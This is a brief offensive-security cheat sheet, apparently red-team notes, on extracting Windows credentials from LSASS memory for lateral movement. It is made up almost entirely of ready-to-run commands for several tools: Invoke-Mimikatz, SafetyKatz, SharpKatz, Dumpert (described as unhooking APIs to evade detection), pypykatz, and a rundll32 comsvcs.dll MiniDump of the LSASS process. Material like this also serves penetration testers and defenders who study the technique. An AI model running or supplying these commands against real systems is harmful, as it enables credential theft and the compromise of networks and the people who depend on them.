# Mimikatz
Mimikatz can be used to dump credentials, tickets, and many more interesting attacks.Invoke-Mimikatz, is a PowerShell port of Mimikatz. Using the code from ReflectivePEInjection, mimikatz is loaded reflectively into the memory. All the functions of mimikatz could be used from this script.The script needs administrative privileges for dumping credentials from local machine. Many attacks need specific privileges which are covered while discussing that attack.

# Lateral Movement - Extracting credentials from LSASS

## Dump credentials on a local machine
```
Invoke-Mimikatz -Command '"sekurlsa::ekeys"'
```
## Using SafetyKatz(Minidumpof lsassand PELoaderto run Mimikatz)
```
SafetyKatz.exe "sekurlsa::ekeys"
```
## Dump credentials Using SharpKatz(C# port of some of Mimikatz functionality)
```
SharpKatz.exe --Command ekeys
```
## Dump credentials using Dumpert(Direct System Calls and API unhooking)
```
rundll32.exe C:\Dumpert\Outflank-Dumpert.dll,Dump
```
## Using pypykatz(Mimikatz functionality in Python)
```
pypykatz.exe live lsa
```
## Using comsvcs.dll
```
tasklist /FI "IMAGENAME eqlsass.exe" rundll32.exe C:\windows\System32\comsvcs.dll, MiniDump <lsassprocess ID> C:\Users\Public\lsass.dmp full
```
# Over Pass The Hash Lateral Movement is in Lateral Movement section.